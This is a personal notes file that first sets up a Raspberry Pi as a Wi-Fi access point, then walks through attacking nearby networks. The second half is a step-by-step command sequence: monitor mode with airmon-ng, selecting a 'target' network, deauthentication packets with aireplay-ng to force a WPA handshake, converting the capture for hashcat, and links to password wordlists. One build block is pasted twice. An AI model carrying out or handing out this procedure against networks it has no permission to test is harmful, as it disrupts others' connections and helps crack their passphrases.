# WiPi


- nm-connection-editor #set shared on ipv4 tab for the wired conn
- ifconfig #check your own ip to get an idea of the network
- sudo nmap -e eno1 -sn 10.42.0.0/24
ssh into the discovered ip
- ssh pi@[IPaddress] #enter password. Nothing shows when you type in a pass on RPi

- sudo su #become the ROOT
- sudo apt update #update the list of packages
maybe upgrade.. restart after upgrade
- sudo apt install vim hostapd dnsmasq
stop the two services

set static ip and disable dhcp on wlan0
- edit /etc/dhcpcd.conf #add to eof
interface wlan0
static ip_address=192.168.3.254/24
denyinterfaces wlan0

rename original file for backup
- sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
create new dnsmasq.conf
- sudo vim /etc/dnsmasq.conf
interface=wlan0
dhcp-range=192.168.3.1,192.168.3.20,255.255.255.0,24h

create configuration for the access point
- vim /etc/hostapd/hostapd.conf #enter the following:
interface=wlan0
driver=nl80211
channel=7 #sets channel within the 2.4Ghz range
wmm_enabled=0 #wireless multimedia auto prioritizes media transmissions
macaddr_acl=0
auth_algs=1 #authentication algorithms. either one or on.. I'm not sure
ignore_broadcast_ssid=0
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ssid=<Network_Name>
wpa_passphrase=<password> #choose a dumb one!

specify the location of the config file we just created
- sudo vim /etc/default/hostapd  #edit the following line
#DAEMON_CONF=""
to
DAEMON_CONF="/etc/hostapd/hostapd.conf"

apt install aircrack-ng p7zip

airmon-ng start wlan1
airmon-ng check kill
airmon-ng start wlan1
airodump-ng wlan1mon #shows nearby networks
ctrl-z
#pick target, new term. basic service set id
mkdir capture
airodump-ng -c [channel# of target] --bssid [bssid] -w /home/pi/capture wlan1mon
#new term, -0 is deauth packets, sending 2, a for AP
aireplay-ng -0 2 -a [get BSSID] wlan1mon
#second terminal has bssid for AP. check for wpa handshake
#convert and then export for cracking

wget https://github.com/hashcat/hashcat-utils/archive/master.zip
unzip master.zip
cd hashcat-utils-master/src
make
#create the hccap file for hashcat
./cap2hccapx.bin /home/pi/capture/-01.cap /home/pi/capture/crackme.hccap

#wordlists
https://da.gd/rockyou
https://da.gd/Top1000

wget https://github.com/hashcat/hashcat-utils/archive/master.zip
unzip master.zip
cd hashcat-utils-master/src
make
#create the hccap file for hashcat
./cap2hccapx.bin /home/pi/capture/-01.cap /home/pi/capture/crackme.hccap





#stop here, unmask and start services. hostapd dnsmasq
